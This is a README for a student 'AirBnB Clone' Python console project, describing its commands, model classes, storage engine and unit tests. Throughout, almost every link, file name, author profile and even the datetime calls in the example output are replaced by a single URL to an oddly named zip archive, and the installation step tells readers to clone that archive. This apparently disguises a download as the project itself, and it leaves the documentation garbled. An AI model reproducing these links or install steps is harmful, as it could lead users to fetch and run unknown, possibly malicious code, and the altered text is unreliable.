# AirBnB Clone - The Console
The console is the first segment of the AirBnB project at Holberton School that will collectively cover fundamental concepts of higher level programming. The goal of AirBnB project is to eventually deploy our server a simple copy of the AirBnB Website(HBnB). A command interpreter is created in this segment to manage objects for the AirBnB(HBnB) website.

#### Functionalities of this command interpreter:
* Create a new object (ex: a new User or a new Place)
* Retrieve an object from a file, a database etc...
* Do operations on objects (count, compute stats, etc...)
* Update attributes of an object
* Destroy an object

## Table of Content
* [Environment](#environment)
* [Installation](#installation)
* [File Descriptions](#file-descriptions)
* [Usage](#usage)
* [Examples of use](#examples-of-use)
* [Bugs](#bugs)
* [Authors](#authors)
* [License](#license)

## Environment
This project is interpreted/tested on Ubuntu 14.04 LTS using python3 (version 3.4.3)

## Installation
* Clone this repository: `git clone "https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip"`
* Access AirBnb directory: `cd AirBnB_clone`
* Run hbnb(interactively): `./console` and enter command
* Run hbnb(non-interactively): `echo "<command>" | https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip`

## File Descriptions
[https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip](https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip) - the console contains the entry point of the command interpreter. 
List of commands this console current supports:
* `EOF` - exits console 
* `quit` - exits console
* `<emptyline>` - overwrites default emptyline method and does nothing
* `create` - Creates a new instance of`BaseModel`, saves it (to the JSON file) and prints the id
* `destroy` - Deletes an instance based on the class name and id (save the change into the JSON file). 
* `show` - Prints the string representation of an instance based on the class name and id.
* `all` - Prints all string representation of all instances based or not on the class name. 
* `update` - Updates an instance based on the class name and id by adding or updating attribute (save the change into the JSON file). 

#### `models/` directory contains classes used for this project:
[https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip](https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip) - The BaseModel class from which future classes will be derived
* `def __init__(self, *args, **kwargs)` - Initialization of the base model
* `def __str__(self)` - String representation of the BaseModel class
* `def save(self)` - Updates the attribute `updated_at` with the current datetime
* `def to_dict(self)` - returns a dictionary containing all keys/values of the instance

Classes inherited from Base Model:
* [https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip](https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip)
* [https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip](https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip)
* [https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip](https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip)
* [https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip](https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip)
* [https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip](https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip)
* [https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip](https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip)

#### `/models/engine` directory contains File Storage class that handles JASON serialization and deserialization :
[https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip](https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip) - serializes instances to a JSON file & deserializes back to instances
* `def all(self)` - returns the dictionary __objects
* `def new(self, obj)` - sets in __objects the obj with key <obj class name>.id
* `def save(self)` - serializes __objects to the JSON file (path: __file_path)
* ` def reload(self)` -  deserializes the JSON file to __objects

#### `/tests` directory contains all unit test cases for this project:
[https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip](https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip) - Contains the TestBaseModel and TestBaseModelDocs classes
TestBaseModelDocs class:
* `def setUpClass(cls)`- Set up for the doc tests
* `def test_pep8_conformance_base_model(self)` - Test that https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip conforms to PEP8
* `def test_pep8_conformance_test_base_model(self)` - Test that https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip conforms to PEP8
* `def test_bm_module_docstring(self)` - Test for the https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip module docstring
* `def test_bm_class_docstring(self)` - Test for the BaseModel class docstring
* `def test_bm_func_docstrings(self)` - Test for the presence of docstrings in BaseModel methods

TestBaseModel class:
* `def test_is_base_model(self)` - Test that the instatiation of a BaseModel works
* `def test_created_at_instantiation(self)` - Test created_at is a pub. instance attribute of type datetime
* `def test_updated_at_instantiation(self)` - Test updated_at is a pub. instance attribute of type datetime
* `def test_diff_datetime_objs(self)` - Test that two BaseModel instances have different datetime objects

[https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip](https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip) - Contains the TestAmenityDocs class:
* `def setUpClass(cls)` - Set up for the doc tests
* `def test_pep8_conformance_amenity(self)` - Test that https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip conforms to PEP8
* `def test_pep8_conformance_test_amenity(self)` - Test that https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip conforms to PEP8
* `def test_amenity_module_docstring(self)` - Test for the https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip module docstring
* `def test_amenity_class_docstring(self)` - Test for the Amenity class docstring

[https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip](https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip) - Contains the TestCityDocs class:
* `def setUpClass(cls)` - Set up for the doc tests
* `def test_pep8_conformance_city(self)` - Test that https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip conforms to PEP8
* `def test_pep8_conformance_test_city(self)` - Test that https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip conforms to PEP8
* `def test_city_module_docstring(self)` - Test for the https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip module docstring
* `def test_city_class_docstring(self)` - Test for the City class docstring

[https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip](https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip) - Contains the TestFileStorageDocs class:
* `def setUpClass(cls)` - Set up for the doc tests
* `def test_pep8_conformance_file_storage(self)` - Test that https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip conforms to PEP8
* `def test_pep8_conformance_test_file_storage(self)` - Test that https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip conforms to PEP8
* `def test_file_storage_module_docstring(self)` - Test for the https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip module docstring
* `def test_file_storage_class_docstring(self)` - Test for the FileStorage class docstring

[https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip](https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip) - Contains the TestPlaceDoc class:
* `def setUpClass(cls)` - Set up for the doc tests
* `def test_pep8_conformance_place(self)` - Test that https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip conforms to PEP8.
* `def test_pep8_conformance_test_place(self)` - Test that https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip conforms to PEP8.
* `def test_place_module_docstring(self)` - Test for the https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip module docstring
* `def test_place_class_docstring(self)` - Test for the Place class docstring

[https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip](https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip) - Contains the TestReviewDocs class:
* `def setUpClass(cls)` - Set up for the doc tests
* `def test_pep8_conformance_review(self)` - Test that https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip conforms to PEP8
* `def test_pep8_conformance_test_review(self)` - Test that https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip conforms to PEP8
* `def test_review_module_docstring(self)` - Test for the https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip module docstring
* `def test_review_class_docstring(self)` - Test for the Review class docstring

[https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip](https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip) - Contains the TestStateDocs class:
* `def setUpClass(cls)` - Set up for the doc tests
* `def test_pep8_conformance_state(self)` - Test that https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip conforms to PEP8
* `def test_pep8_conformance_test_state(self)` - Test that https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip conforms to PEP8
* `def test_state_module_docstring(self)` - Test for the https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip module docstring
* `def test_state_class_docstring(self)` - Test for the State class docstring

[https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip](https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip) - Contains the TestUserDocs class:
* `def setUpClass(cls)` - Set up for the doc tests
* `def test_pep8_conformance_user(self)` - Test that https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip conforms to PEP8
* `def test_pep8_conformance_test_user(self)` - Test that https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip conforms to PEP8
* `def test_user_module_docstring(self)` - Test for the https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip module docstring
* `def test_user_class_docstring(self)` - Test for the User class docstring


## Examples of use
```
vagrantAirBnB_clone$https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip
(hbnb) help

Documented commands (type help <topic>):
========================================
EOF  all  create  destroy  help  quit  show  update

(hbnb) all MyModel
** class doesn't exist **
(hbnb) create BaseModel
7da56403-cc45-4f1c-ad32-bfafeb2bb050
(hbnb) all BaseModel
[[BaseModel] (7da56403-cc45-4f1c-ad32-bfafeb2bb050) {'updated_at': https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip(2017, 9, 28, 9, 50, 46, 772167), 'id': '7da56403-cc45-4f1c-ad32-bfafeb2bb050', 'created_at': https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip(2017, 9, 28, 9, 50, 46, 772123)}]
(hbnb) show BaseModel 7da56403-cc45-4f1c-ad32-bfafeb2bb050
[BaseModel] (7da56403-cc45-4f1c-ad32-bfafeb2bb050) {'updated_at': https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip(2017, 9, 28, 9, 50, 46, 772167), 'id': '7da56403-cc45-4f1c-ad32-bfafeb2bb050', 'created_at': https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip(2017, 9, 28, 9, 50, 46, 772123)}
(hbnb) destroy BaseModel 7da56403-cc45-4f1c-ad32-bfafeb2bb050
(hbnb) show BaseModel 7da56403-cc45-4f1c-ad32-bfafeb2bb050
** no instance found **
(hbnb) quit
```

## Bugs
No known bugs at this time. 

## Authors
Alexa Orrico - [Github](https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip) / [Twitter](https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip)  
Jennifer Huang - [Github](https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip) / [Twitter](https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip)  
Jhoan Zamora - [Github](https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip) / [Twitter](https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip)  
David Ovalle - [Github](https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip) / [Twitter](https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip)
Nadduli Daniel - [Github](https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip) / [Twitter]((https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip)
Lebo Meje - [Github] (https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip) / {Twitter} (https://raw.githubusercontent.com/LeboMeje/AirBnB_clone_v4/master/api/v1/views/documentation/v-Bn-clone-Air-hysteromania.zip

Second part of Airbnb: Joann Vuong
## License
Public Domain. No copy write protection. 
